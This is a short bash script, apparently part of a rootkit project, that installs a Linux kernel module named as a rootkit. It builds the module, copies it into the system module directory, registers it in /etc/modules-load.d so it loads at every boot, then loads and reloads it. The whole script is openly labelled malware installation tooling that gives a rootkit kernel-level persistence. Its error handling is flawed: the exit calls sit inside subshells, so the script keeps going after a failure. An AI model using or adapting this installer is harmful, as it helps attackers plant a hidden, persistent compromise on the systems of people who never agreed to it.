#!/bin/bash

if [ $(id -u) != 0 ]; then
    echo "Please run as root"
    exit
fi

echo "Installing Rootkit..."
echo "====================="
echo "build rootkit for system..."
make >/dev/null && echo "Rootkit built." || (echo "ERROR! unable to build rootkit" && exit)
echo "install rootkit module ..."
cp rootkit.ko /lib/modules/$(uname -r)/ && echo "installed rootkit module" || (echo "ERROR! could not install rootkit module" && exit)
echo "enable rootkit module ..."
echo "rootkit" > /etc/modules-load.d/rootkit.conf && echo "enabled rootkit module" || (echo "ERROR! could not enable rootkit" && exit)
echo "cleanup"
make clean >/dev/null && echo "All cleaned up" || (echo "ERROR! could not clean up" && exit)
echo "create depmap..."
depmod && echo "Depmap created" || (echo "ERROR! could not create depmap" && exit)
echo "immediately load rootkit..."
/usr/lib/systemd/systemd-modules-load /etc/modules-load.d/rootkit.conf && echo "Rootkit inserted." || (echo "ERROR! could not insert rootkit." && exit)
echo "reset rootkit (debugging)..."
rmmod rootkit && echo "disabled rootkit" || echo "ERROR! could not disable rootkit"
/usr/lib/systemd/systemd-modules-load /etc/modules-load.d/rootkit.conf && echo "Rootkit inserted." || (echo "ERROR! could not insert rootkit." && exit)